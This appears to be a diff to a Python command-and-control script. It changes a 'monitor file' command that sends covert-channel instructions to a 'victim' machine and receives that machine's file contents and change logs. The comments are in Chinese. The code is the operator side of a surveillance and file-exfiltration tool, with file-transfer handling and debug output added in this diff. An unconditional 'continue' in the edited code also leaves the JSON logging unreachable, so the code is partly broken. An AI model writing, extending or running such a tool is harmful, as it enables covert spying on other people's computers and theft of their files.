@@ -297,47 +297,56 @@ def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
     date_str = datetime.now().strftime("%Y-%m-%d")
     log_filename = f"{date_str}.log"
-    print(f"[*] 开始监控文件：{file_path}，日志：{log_filename}，Ctrl+C 停止。")
-    # 先告诉 Victim 开始监控
+    print(f"[DEBUG][Commander] Sending CMD_MON_FILE:{file_path}")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
-            buffer = ""
             while True:
-                chunk = comm.recv_covert_message()
-                if chunk is None:
+                data = comm.recv_covert_message()
+                print(f"[DEBUG][Commander] recv_covert_message raw: {data!r}")
+                if data is None:
                     continue
-                buffer += chunk.decode('utf-8', errors='ignore')
-                # 处理完整 JSON 行
-                while "\n" in buffer:
-                    line, buffer = buffer.split("\n", 1)
-                    try:
-                        msg = json.loads(line)
-                    except:
-                        continue
-                    if msg.get("type") == "MON_FILE_MODIFIED":
-                        ts = msg.get("timestamp", "")
-                        path = msg.get("path", "")
-                        # 1) 打印日志
-                        print(f"[{ts}] 文件已修改：{path}")
-                        logfile.write(line + "\n")
-                        logfile.flush()
-                        # 2) 主动用下载逻辑抓取最新文件
-                        #    复用你已有的 cmd_get_file，但为了方便，这里内联一个简化版：
-                        print(f"[*] 检测到变更，正在下载最新文件…")
-                        comm.send_covert_message(f"CMD_GET:{path}".encode())
-                        file_data = comm.recv_covert_message()
-                        if file_data:
-                            local_name = os.path.basename(path)
-                            with open(local_name, "wb") as f:
-                                f.write(file_data)
-                            print(f"[*] 已保存最新版本到 {local_name}")
-                        else:
-                            print("[!] 下载失败或无响应")
+
+                # —— 1. 二进制文件推送 ——
+                if data.startswith(b"FILE_TRANSFER:"):
+                    # 拆 header
+                    parts = data.split(b":", 2)
+                    if len(parts) == 3:
+                        filename = parts[1].decode()
+                        file_bytes = parts[2]
+                        print(f"[DEBUG][Commander] Received FILE_TRANSFER for {filename}, {len(file_bytes)} bytes")
+                        # 保存到根目录
+                        with open(filename, "wb") as out:
+                            out.write(file_bytes)
+                        print(f"[*] 已接收并保存文件：{filename}")
                     else:
-                        # 处理其他类型事件（可选）
-                        pass
+                        print("[!] 文件传输消息格式错误")
+                    continue
+
+                # —— 2. 原有 JSON 日志推送 ——
+
+                try:
+                    line = data.decode('utf-8', errors='ignore').strip()
+                    print(f"[DEBUG][Commander] JSON line: {line}")
+                    msg = json.loads(line)
+                    print(f"[DEBUG][Commander] Parsed JSON msg: {msg}")
+                except Exception as e:
+                    print(f"[DEBUG][Commander] JSON parse error: {e}")
+
+                continue
+
+                ts = msg.get('timestamp', '')
+                typ = msg.get('type', '')
+                path = msg.get('path', '')
+                content = msg.get('content', '')
+
+                # 打印并记录到日志
+                print(f"[{ts}] {typ} | {path}")
+                print(content)
+                print("-" * 40)
+                logfile.write(line + "\n")
+                logfile.flush()
 
         except KeyboardInterrupt:
             print("\n[*] 停止文件监控。")
